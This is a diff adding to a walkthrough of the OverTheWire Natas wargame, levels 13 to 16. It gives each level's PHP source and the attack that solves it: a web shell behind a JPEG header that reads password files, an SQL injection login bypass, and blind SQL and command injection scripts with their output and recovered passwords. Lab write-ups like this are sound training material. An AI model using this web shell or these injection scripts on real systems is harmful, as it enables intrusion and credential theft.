@@ -362,9 +362,10 @@ echo base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");
 // b'\nUK"\x1e\x00H+\x02\x04O%\x03\x13\x1apS\x19Wh]UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
 ```
 
-Step 2: We create `solve.py` (python3) to generate new cookie.
+Step 2: We create `solve.py` to generate new cookie.
 
 ```python
+#!/usr/bin/python3
 import base64
 
 data = '{"showpassword":"no","bgcolor":"#ffffff"}'
@@ -391,6 +392,8 @@ print('cookie:', base64.b64encode(cookie.encode()))
 ```
 
 ```
+python3 solve.py
+
 data: {"showpassword":"no","bgcolor":"#ffffff"}
 xoring: b'\nUK"\x1e\x00H+\x02\x04O%\x03\x13\x1apS\x19Wh]UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
 char of key: 113
@@ -521,3 +524,393 @@ Add param into url `?cmd=cat /etc/natas_webpass/natas13`.
 ```
 jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 ```
+
+### natas13
+
+```php
+<? 
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";    
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+    
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<? } ?> 
+```
+
+When we upload `.php` file, the response is `"File is not an image` because the function `exif_imagetype`. This method only reads the first bytes of an image and checks its signature. For details file signature, you can visit [`here`](https://filesignatures.net/index.php?search=jpg&mode=EXT). So we can inject php code to somewhere in image, as long as not in the first bytes.
+
+We create the `shell.php` with first bytes is \xFF\xD8\xFF\xE0 (JPG's signature) by using `shell_image.py` look like following:
+
+```python
+# shell_image.py
+f = open('shell.php', 'w')
+f.write('\xFF\xD8\xFF\xE0' + '\t' + '<?php $data=system($_GET["cmd"]); echo $data;?>')
+f.close()
+```
+When try open `shell.php`:
+
+```php
+ÿØÿà    <?php $data=system($_GET["cmd"]); echo $data;?>
+```
+
+After upload `shell.php`, we can see:
+
+```php
+����
+Notice: Undefined index: cmd in /var/www/natas/natas13/upload/2i08bhv52e.php on line 1
+
+Warning: system(): Cannot execute a blank command in /var/www/natas/natas13/upload/2i08bhv52e.php on line 1
+```
+
+Add param into url `?cmd=cat /etc/natas_webpass/natas14`, we can get the password natas14
+
+```
+���� Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+```
+
+### natas14
+
+```php
+<?
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas14', '<censored>');
+    mysql_select_db('natas14', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysql_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<? } ?> 
+```
+
+This is sql injection, when we fill `"` into `username` input, response contain error:
+
+```php
+Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
+Access denied!
+```
+
+Change payload `natas15" or 1=1 -- -` and fill into `username` input:
+
+```
+ Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+```
+
+### natas15
+
+```php
+<?
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas15', '<censored>');
+    mysql_select_db('natas15', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<? } ?> 
+```
+
+Try fill `natas16` into username input, we get the response `This user exists.` So we use sql injection to find password of natas16.
+The payload look like that: SELECT * from users where username="`natas16" and password="abcxyz`".
+
+If `mysql_num_rows($res) > 0` -> correct password -> `This user exists.`, else wrong password -> `This user doesn't exist.`
+
+We need inject sql to find char by char password, so we use `substring()` in sql.
+
+
+Step 1: Brute-force length password
+
+```
+username=natas16%22+and+length(password)+=+%22§6§ -> Check response `This user exists.` -> Length of password is 32.
+```
+
+Step 2: Brute-force char by char password
+
+```
+username=natas16%22+and+substring(password,§1§,1)+=+%22§a§ -> Check response `This user exists.` -> waiheacj63wnnibroheqi3p9t0m5nhmh
+```
+
+??? But SQL case-insentive, char by char is upper or lower???
+
+Step 3: Brute-force binary char:
+
+```
+username=natas16%22+and+substring(password,§1§,1)+LIKE+BINARY+%22§w§ -> Check response `This user exists.` -> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
+
+This following python code `solve.py`:
+
+```python
+#!/usr/bin/python3
+import requests
+from string import ascii_lowercase, digits
+
+url = "http://natas15.natas.labs.overthewire.org/index.php"
+auth_username = "natas15"
+auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
+
+# brute-force length
+for i in range(100):
+    uri = '{}?username=natas16%22+and+length(password)+=+%22{}'.format(url, i)
+    r = requests.get(uri, auth=(auth_username,auth_password))
+    if 'This user exists.' in r.text:
+        length = 32
+        print('password length:', i)
+        break
+
+characters = ascii_lowercase + digits
+print('characters:', characters)
+
+# brute-force char
+password_lower = ''
+for i in range(length):
+    for char in characters:
+        uri = '{}?username=natas16%22+and+substring(password,{},1)+=+%22{}'.format(url, i+1, char)
+        r = requests.get(uri, auth=(auth_username,auth_password))
+        if 'This user exists.' in r.text:
+            password_lower += char
+            break
+
+# fix case-insentive
+password = ''
+for i, char in enumerate(password_lower):
+    uri = '{}?username=natas16%22+and+substring(password,{},1)+LIKE+BINARY+%22{}'.format(url, i+1, char)
+    r = requests.get(uri, auth=(auth_username,auth_password))
+    if 'This user exists.' in r.text:
+        password += char
+    else:
+        password += char.upper()
+    print('password:', password)
+```
+
+```
+python3 solve.py
+
+password length: 32
+characters: abcdefghijklmnopqrstuvwxyz0123456789
+password: W
+password: Wa
+password: WaI
+password: WaIH
+password: WaIHE
+password: WaIHEa
+password: WaIHEac
+password: WaIHEacj
+password: WaIHEacj6
+password: WaIHEacj63
+password: WaIHEacj63w
+password: WaIHEacj63wn
+password: WaIHEacj63wnN
+password: WaIHEacj63wnNI
+password: WaIHEacj63wnNIB
+password: WaIHEacj63wnNIBR
+password: WaIHEacj63wnNIBRO
+password: WaIHEacj63wnNIBROH
+password: WaIHEacj63wnNIBROHe
+password: WaIHEacj63wnNIBROHeq
+password: WaIHEacj63wnNIBROHeqi
+password: WaIHEacj63wnNIBROHeqi3
+password: WaIHEacj63wnNIBROHeqi3p
+password: WaIHEacj63wnNIBROHeqi3p9
+password: WaIHEacj63wnNIBROHeqi3p9t
+password: WaIHEacj63wnNIBROHeqi3p9t0
+password: WaIHEacj63wnNIBROHeqi3p9t0m
+password: WaIHEacj63wnNIBROHeqi3p9t0m5
+password: WaIHEacj63wnNIBROHeqi3p9t0m5n
+password: WaIHEacj63wnNIBROHeqi3p9t0m5nh
+password: WaIHEacj63wnNIBROHeqi3p9t0m5nhm
+password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
+
+### natas16
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+
+Some certain characters was filtered, but we can use `$()` command in GNU to create payload:
+
+`$(grep -E ^§a§.* /etc/natas_webpass/natas17)African`, -E is regex.
+
+With above playload, first the application run `$(grep -E ^§a§.* /etc/natas_webpass/natas17)African`, return `'abcxyzAfrican'`, then run `$(grep -i 'abcxyzAfrican' dictionary.txt)`.
+
+Because `'African'` is one word in dictionary.txt, if first command return `None` -> the second command run `$(grep -i 'African' dictionary.txt)` and show dictionary.
+
+Vice versa, if first command return `123456African` -> the second command return `None`, because the word `123456African` isn't in dictionary.txt and don't show dictionary. Then we can confirm that `123456` is part of the password. Next we will use blind injection to get full password.
+
+This following python code `solve.py`:
+
+```python
+#!/usr/bin/python3
+import requests
+from string import ascii_letters, digits
+
+url = "http://natas16.natas.labs.overthewire.org"
+auth_username = "natas16"
+auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
+
+characters = ascii_letters + digits
+print('characters:', characters)
+
+password = ''
+
+for i in range(35):
+    for char in characters:
+        uri = "{}?needle=$(grep -E ^{}{}.* /etc/natas_webpass/natas17)African".format(url, password, char)
+        r = requests.get(uri, auth=(auth_username,auth_password))
+        if 'African' not in r.text:
+            password += char
+            print('password:', password)
+            break
+        else: 
+            continue
+```
+
+```
+python3 solve.py
+characters: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
+password: 8
+password: 8P
+password: 8Ps
+password: 8Ps3
+password: 8Ps3H
+password: 8Ps3H0
+password: 8Ps3H0G
+password: 8Ps3H0GW
+password: 8Ps3H0GWb
+password: 8Ps3H0GWbn
+password: 8Ps3H0GWbn5
+password: 8Ps3H0GWbn5r
+password: 8Ps3H0GWbn5rd
+password: 8Ps3H0GWbn5rd9
+password: 8Ps3H0GWbn5rd9S
+password: 8Ps3H0GWbn5rd9S7
+password: 8Ps3H0GWbn5rd9S7G
+password: 8Ps3H0GWbn5rd9S7Gm
+password: 8Ps3H0GWbn5rd9S7GmA
+password: 8Ps3H0GWbn5rd9S7GmAd
+password: 8Ps3H0GWbn5rd9S7GmAdg
+password: 8Ps3H0GWbn5rd9S7GmAdgQ
+password: 8Ps3H0GWbn5rd9S7GmAdgQN
+password: 8Ps3H0GWbn5rd9S7GmAdgQNd
+password: 8Ps3H0GWbn5rd9S7GmAdgQNdk
+password: 8Ps3H0GWbn5rd9S7GmAdgQNdkh
+password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP
+password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
+password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
+password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
+password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
+password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+```
+
+### natas17
+
